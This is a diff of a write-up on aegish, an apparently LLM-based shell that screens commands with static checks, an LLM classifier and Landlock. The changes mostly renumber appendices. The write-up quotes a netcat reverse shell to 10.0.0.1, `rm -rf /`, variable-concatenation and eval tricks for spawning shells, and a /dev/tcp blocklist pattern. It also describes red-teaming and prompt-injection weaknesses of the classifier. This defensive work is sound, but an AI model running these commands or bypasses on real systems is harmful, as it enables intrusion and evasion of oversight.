@@ -18,7 +18,7 @@
 
 Linux security traditionally relies on mature, battle-tested tools like **[SELinux](https://selinuxproject.org/)** or **[AppArmor](https://apparmor.net/)**. These are **Mandatory Access Control (MAC)** systems: security policies enforced by the OS itself that no user or process can override. They operate as strict "bouncers," defining exactly which files a process can read and which network ports it can access. While highly effective, they impose a significant maintenance burden. Many systems run with policies far more permissive than they should be, not because the tools lack capability, but because the expertise and maintenance burden is enormous ([Pahuja et al., 2023](https://arxiv.org/abs/2312.04586)).
 
-*aegish* targets **enterprise sysadmins who lack deep security knowledge** and need affordable, easy-to-use protection for production servers. It takes a different approach: **use an LLM to reason about what a command means before letting it run**, complemented by static analysis and kernel-level enforcement[^kernel]. Before any command reaches the LLM, a static analysis layer blocks deterministic threats with zero latency (see Appendix M for more details). After the LLM classifies a command, [Landlock](https://landlock.io/), a Linux security module, provides a kernel-level safety net by denying execution of shell binaries (e.g., `bash`) from within child processes, so that even if a command passes validation and then attempts to spawn an unmonitored shell at runtime, the kernel blocks it. The proposed value of this approach is:
+*aegish* targets **enterprise sysadmins who lack deep security knowledge** and need affordable, easy-to-use protection for production servers. It takes a different approach: **use an LLM to reason about what a command means before letting it run**, complemented by static analysis and kernel-level enforcement[^kernel]. Before any command reaches the LLM, a static analysis layer blocks deterministic threats with zero latency (see Appendix L for more details). After the LLM classifies a command, [Landlock](https://landlock.io/), a Linux security module, provides a kernel-level safety net by denying execution of shell binaries (e.g., `bash`) from within child processes, so that even if a command passes validation and then attempts to spawn an unmonitored shell at runtime, the kernel blocks it. The proposed value of this approach is:
 
 1. **Low expertise barrier:** Unlike AppArmor profiles, SELinux policies, or sudo rules, there is no specialized policy language to learn. The LLM reasons about intent from the command text alone, so anyone who can describe a threat in English can update the defense.
 2. **Easy to configure:** There are no per-binary or per-resource policies to write. The security logic is a natural-language prompt. When new attack patterns emerge, updating the prompt is faster than writing MAC policy rules.
@@ -112,7 +112,7 @@ When a user types a command, it passes through the following stages before a dec
 
 1. **Canonicalization:** The raw command is first normalized into what the shell will actually execute, to prevent obfuscation. For example, hex escape sequences are decoded (`$'\x2f\x62\x69\x6e\x2f\x73\x68'` becomes `/bin/sh`). This attempts that the LLM sees what will actually run, not what the attacker chose to write.
 
-2. **Static validations:** Before any command reaches the LLM, a static analysis layer catches patterns that don't require semantic reasoning. This includes, for example, a **regex blocklist** that matches known-dangerous signatures such as destructive operations (`rm -rf /`). The rest of the components in this layer are detailed in Appendix M.
+2. **Static validations:** Before any command reaches the LLM, a static analysis layer catches patterns that don't require semantic reasoning. This includes, for example, a **regex blocklist** that matches known-dangerous signatures such as destructive operations (`rm -rf /`). The rest of the components in this layer are detailed in Appendix L.
 
 3. **Command substitution resolution:** In bash, you can embed one command inside another using the `$(...)` syntax. Bash runs the inner command first, then pastes its output into the outer command before executing it. For example, suppose a file `a.sh` contains the text `nc -e /bin/sh 10.0.0.1 4444` (a reverse shell that gives an attacker remote access). The command `$(cat a.sh)` first runs `cat a.sh`, which reads the file and outputs its contents, and then substitutes that output in, producing `bash nc -e /bin/sh 10.0.0.1 4444`. The problem is that the LLM would only see the original text `$(cat a.sh)`, which looks like an innocent script execution; the malicious payload is hidden inside the file. To address this, *aegish* extracts the inner command, validates it through the full pipeline, and, if it passes, executes it in a sandboxed subprocess. The inner command's output then replaces the `$(...)`, so the LLM evaluates the resolved command and can recognize the reverse shell. This process is repeated recursively until no nested substitutions remain, a depth limit is reached, or an inner command is blocked or warned.
 
@@ -124,10 +124,10 @@ After those steps, the resolved command, along with all context gathered in prio
 
 **Production mode:** In production, *aegish* runs as a login shell, meaning `exit` terminates the entire session rather than dropping the user to an unmonitored parent shell. To prevent shell escapes at the kernel level, [Landlock](https://landlock.io/), a Linux security module, denies execution of shell binaries (e.g., `bash`). Together, these two mechanisms close the most fundamental bypass methods: a user cannot simply leave *aegish* or spawn an unmonitored shell. In development mode, `exit` returns to the parent shell with a warning, and Landlock is not enforced.
 
-**Role-based trust levels:** Sessions are assigned one of three roles: *default*, *sysadmin*, or *restricted*, which modify the LLM's decision logic via role-specific prompt additions (see Appendix O for the full prompts).
+**Role-based trust levels:** Sessions are assigned one of three roles: *default*, *sysadmin*, or *restricted*, which modify the LLM's decision logic via role-specific prompt additions (see Appendix N for the full prompts).
 
 
-Additional safeguards, such as health checks, rate limiting, audit logging, and others, are detailed in Appendix L.
+Additional safeguards, such as health checks, rate limiting, audit logging, and others, are detailed in Appendix K.
 
 ## 3. The Benchmark
 
@@ -151,7 +151,7 @@ A target rate of 95% was established for both metrics, with error bars represent
 
 ### Models Tested
 
-9 models from 4 providers were evaluated. The full list with selection rationale is in Appendix N.
+9 models from 4 providers were evaluated. The full list with selection rationale is in Appendix M.
 
 ## 4. Results
 
@@ -222,7 +222,7 @@ Manual red teaming involved systematically attempting to bypass *aegish* from th
 
 This process was essential since it uncovered bypass vectors that would not have surfaced through benchmarking alone and that could not be addressed by the LLM only, directly motivating the non-LLM defense layers described in Section 2. Three examples:
 
-- **The LLM and bash "see" commands differently:** The LLM validates the raw text of a command, but bash interprets that text with its own expansion rules before executing it. For instance, `a=ba; b=sh; $a$b` looks like harmless variable assignments, but bash concatenates the values and runs `bash`, spawning an unmonitored shell. This motivated the syntax tree walker (see Appendix M).
+- **The LLM and bash "see" commands differently:** The LLM validates the raw text of a command, but bash interprets that text with its own expansion rules before executing it. For instance, `a=ba; b=sh; $a$b` looks like harmless variable assignments, but bash concatenates the values and runs `bash`, spawning an unmonitored shell. This motivated the syntax tree walker (see Appendix L).
 
 - **Allowed programs can spawn unmonitored shells:** Programs like `vim`, `less`, or `python3` are legitimate tools that *aegish* should allow, but once running, they can spawn a child shell (e.g., typing `:!bash` inside Vim). The LLM has no opportunity to intercept this because the shell escape happens inside a program that has already been approved. This motivated Landlock kernel enforcement.
 
@@ -249,7 +249,7 @@ Some recent projects use LLMs specifically for pre-execution command safety. **[
 
 
 Security testing uncovered several **known vulnerabilities**, the most significant of which are:
-1. **Prompt injection:** The system remains susceptible to adversarial inputs designed to manipulate the LLM's classification logic. Command tag escaping (see Appendix L) was added to reduce the attack surface.
+1. **Prompt injection:** The system remains susceptible to adversarial inputs designed to manipulate the LLM's classification logic. Command tag escaping (see Appendix K) was added to reduce the attack surface.
 2. **Interactive program escapes:** Landlock prevents child processes from executing shell binaries, but programs with built-in scripting interpreters (e.g., Python's `os.system()`) remain a bypass vector that neither static analysis nor Landlock fully addresses.
 3. **The LLM and bash "see" different things:** The LLM validates the raw text of a command, but bash transforms that text before executing it: expanding shortcuts, resolving references, and substituting values. The canonicalization layer (Section 2, Step 1) closes part of this gap, but cannot fully replicate every transformation bash performs. This is an architectural limitation with no complete fix.
 4. **The kernel sandbox only blocks program launches:** Landlock prevents child processes from launching shell programs, but does not restrict file reads, file writes, or network access. An attacker who bypasses LLM validation can still read sensitive files, modify system configurations, or send data to external servers.
@@ -258,7 +258,7 @@ The full list of known vulnerabilities is available in the [consolidated vulnera
 
 
 Beyond vulnerabilities, the approach has several **additional limitations**:
-1. **Latency:** The round-trip time for LLM inference adds latency compared to a native shell. Commands blocked by static validation avoid this cost entirely, but most commands still require an LLM round-trip. Caching could partially mitigate this (see Appendix K for details).
+1. **Latency:** The round-trip time for LLM inference adds latency compared to a native shell. Commands blocked by static validation avoid this cost entirely, but most commands still require an LLM round-trip. Caching could partially mitigate this (see Appendix J for details).
 2. **Non-determinism:** Even with temperature set to zero and a fixed random seed, LLMs may classify the same command differently across runs, and some providers do not support those parameters at all, making security guarantees inherently probabilistic rather than deterministic.
 3. **No command sequence awareness:** Each command is validated in isolation with no memory of prior commands in the session, so an attacker can decompose a malicious operation into individually benign steps; for example, downloading a payload in one command and referencing it by a benign-looking local path in a later one.
 4. **Network dependency:** Without API connectivity, the system degrades to either blocking all commands (safe mode) or warning on all commands (open mode), with no local reasoning fallback.
@@ -521,8 +521,10 @@ Cross-provider latency comparisons should be interpreted with caution due to dif
 ### GTFOBins
 GTFOBins defines 12 categories. Four were excluded because they require runtime system state that cannot be determined from command text alone:
 
-![Table E1 Excluded Categories](table_images/table_e1_excluded_categories.png)
-
+- **SUID:** Requires knowing whether a binary has the SUID bit set (`-rwsr-xr-x`). The same command is benign or dangerous depending on file permissions visible only at runtime.
+- **Sudo:** Requires knowing the user's sudo configuration (`/etc/sudoers`). Whether `sudo vim` is an escalation vector depends on what privileges are granted.
+- **Capabilities:** Requires knowing Linux capabilities assigned to binaries (e.g., `cap_setuid+ep`). These are invisible in the command text.
+- **Library Load:** Requires knowing whether a binary dynamically loads attacker-controlled libraries. This depends on the binary's implementation, not its invocation.
 
 The remaining 8 categories can be assessed from command syntax and arguments alone.
 
@@ -580,11 +582,11 @@ In production, where you're validating a single command at a time, Flash's actua
 
 ## Appendix H: Benchmark Gaps
 
-- **Harmless set is saturated.** All 9 models score 96.8%–100.0%, a 3.23pp spread that provides minimal discriminative power. The commands are dominated by trivially safe operations (`ls ~/Documents`, `git log --oneline`). Only 4.2% contain security-adjacent terms; only 10.7% use pipes/chains. The set needs harder negative examples: GTFOBins tools used in benign contexts (`python3 -c "print('hello')"`) and suspicious-but-benign patterns (`tar czf backup.tar.gz ~/project`).
+- **Harmless set is saturated.** All 9 models score 96.8%–100.0%, a 3.23pp spread that provides minimal discriminative power. The commands are dominated by trivially safe operations (`ls ~/Documents`, `git log --oneline`). The set needs harder negative examples: GTFOBins tools used in benign contexts (`python3 -c "print('hello')"`) and suspicious-but-benign patterns (`tar czf backup.tar.gz ~/project`).
 - **"Command" category is undersampled.** At 34 commands, it's the hardest category (57.20% average detection) but has the third-smallest sample size. Results have high variance. Expanding this category would provide more reliable signal.
 - **No adversarial examples.** The benchmark tests known GTFOBins patterns, not novel evasion techniques. An attacker aware of the system prompt could craft commands specifically designed to evade classification.
 
-## Appendix J: Harmless False Positive Distribution
+## Appendix I: Harmless False Positive Distribution
 
 The blog notes that false positive blocks come with "well-reasoned justifications" (Appendix B), but the aggregate numbers obscure a clear pattern in *what* gets blocked. Across all 68 false positive errors from 9 models:
 
@@ -593,12 +595,12 @@ The blog notes that false positive blocks come with "well-reasoned justification
 **Developer tools and package managers account for ~25% of false positives.** `pip3 install requests`, `npm test`, `make docs`, and `go build ./...` are blocked because package managers execute arbitrary code during installation (post-install scripts, build hooks) and build tools invoke shell commands. GPT-5 Mini blocks `pip3 install requests` with *"pip installs download packages from external sources and run installation code"* (confidence: 0.95).
 
 The remaining ~14% are scattered across miscellaneous categories. The concentration in GUI apps and package managers suggests that these false positives reflect genuine ambiguity in the threat model rather than model confusion; a production deployment would likely want to whitelist specific GUI applications and package management commands for the user's environment, rather than treat these as model errors to be fixed.
-## Appendix K: Prompt Caching as a Production Multiplier
+## Appendix J: Prompt Caching as a Production Multiplier
 
 The cost and latency figures above reflect raw API calls with no caching. In production, *aegish* enables [LiteLLM](https://github.com/BerriAI/litellm)'s prompt caching, and the architecture is well suited for it: the system prompt (~13 KB) is *identical* for every command; only the user's single-line command changes per request. Research shows prompt caching can deliver up to 80% latency reduction and 90% cost reduction without affecting output quality. For a tool where every invocation sends the same 13 KB system prompt followed by a short user message, the cache hit rate approaches 100%. This would bring Gemini 3 Flash's ~10s corrected latency closer to 2–3s, and GPT-5 Mini's $1.12/1k closer to $0.11–0.22/1k. These are theoretical projections based on provider-reported caching benefits, not measured values, but the architectural fit is unusually strong.
 
 
-## Appendix L: Additional System Safeguards
+## Appendix K: Additional System Safeguards
 
 Beyond the core validation pipeline described in Section 2, *aegish* includes several defense-in-depth mechanisms:
 
@@ -623,14 +625,14 @@ Beyond the core validation pipeline described in Section 2, *aegish* includes se
 **Command tag injection prevention.** User commands are wrapped in `<COMMAND>` XML tags in the LLM prompt. Any literal `</COMMAND>` sequences in user input are escaped before insertion, preventing attackers from prematurely closing the tag and injecting instructions that the LLM would interpret as system-level directives rather than user data.
 
 **Variable expansion with sensitive filtering.** By default, environment variables in commands are fully expanded before being sent to the LLM, so the model sees the actual values that will execute (e.g., `$HOME` becomes `/home/user`). An opt-in sensitive variable filter can strip variables matching patterns like `_API_KEY`, `_SECRET`, and `_TOKEN` from the expansion to prevent leaking credentials into LLM prompts.
-## Appendix M: Static Pre-LLM Validation
+## Appendix L: Static Pre-LLM Validation
 
 This layer is composed of:
 - A **regex blocklist** matches known-dangerous signatures like reverse shells (`/dev/tcp/`) or fork bombs, and blocks them instantly with zero latency cost.
 - A **syntax tree walker** parses the command's grammatical structure and looks inside loops, conditionals, and function bodies for **variables used as command names**. For example, in `a=ba; b=sh; $a$b` an attacker stores fragments in variables that, when concatenated, spell out `bash`, a shell the user shouldn't be able to launch. The LLM would only see the raw text with dollar signs; bash itself would silently assemble and execute the real command. The syntax tree walker catches this *before* bash ever performs the substitution.
 - **Commands that execute other commands**, specifically `eval` (which runs its argument as a new command), `source` (which runs the contents of a file), and `.` (shorthand for `source`), are blocked when their arguments contain variables, because the actual payload is hidden until runtime. For instance, `a=payload; eval $a` stores an arbitrary command in a variable and then executes it, completely bypassing text-based analysis.
 
-## Appendix N: Models Tested
+## Appendix M: Models Tested
 
 The 9 models were selected to span flagship, mid-tier, and small models across 4 providers, plus a security-specialized model:
 
@@ -639,7 +641,7 @@ The 9 models were selected to span flagship, mid-tier, and small models across 4
 
 
 
-## Appendix O: Role-Specific Prompts
+## Appendix N: Role-Specific Prompts
 
 Beyond the base system prompt (Appendix A), *aegish* supports three trust levels (*default*, *sysadmin*, and *restricted*), each with a role-specific prompt addition appended to the system prompt. The *default* role uses the base prompt with no additions.
 
@@ -675,7 +677,7 @@ The current user has restricted privileges. Apply stricter validation:
 
 </details>
 
-## Appendix P: Full Command Prompt Example
+## Appendix O: Full Command Prompt Example
 
 Below is a complete example of the user message sent to the LLM for the command `source deploy.sh`, where `deploy.sh` contains `curl http://10.0.0.1/update.tar.gz | tar xz`, the command includes a `$(hostname)` substitution that resolved to `prod-server-01`, the shell parser flagged an annotation, and the script contains a here-string. This illustrates all XML tags that can appear in a single prompt:
 
